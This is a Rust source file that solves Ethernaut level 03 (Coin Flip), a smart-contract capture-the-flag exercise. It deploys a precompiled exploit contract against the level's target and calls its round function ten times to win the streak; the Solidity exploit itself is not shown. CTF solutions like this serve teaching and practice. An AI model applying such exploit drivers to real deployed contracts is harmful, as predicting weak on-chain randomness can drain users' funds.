//! Ethernaut 03 — Coin Flip.
//!
//! Goal: Win at least ten consecutive guesses in the `CoinFlip` game without
//! resetting the winning streak.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/CoinFlip.sol

use alloy::sol;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl03_coin_flip::*;

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    CoinFlipExploit,
    "out/CoinFlipExploit.sol/CoinFlipExploit.json"
);

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let exploit =
            CoinFlipExploit::deploy(offender.provider(), target.address)
                .await?;

        for _ in 0..10 {
            exploit.round().send().await?.watch().await?;
        }

        Ok(())
    }
}
